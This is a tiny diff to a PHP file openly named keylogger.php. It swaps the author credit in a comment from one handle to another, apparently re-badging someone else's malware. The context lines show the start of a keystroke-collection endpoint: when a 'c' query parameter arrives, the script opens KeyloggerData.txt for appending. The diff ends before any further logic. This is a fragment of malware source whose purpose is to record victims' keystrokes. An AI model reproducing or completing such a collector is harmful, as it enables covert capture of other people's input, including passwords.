@@ -1,5 +1,5 @@
 <?php
-// keylogger.php by Aing
+// keylogger.php by ANONUD4Y
  
 if(!empty($_GET['c'])) {
     $logfile = fopen('KeyloggerData.txt', 'a+');
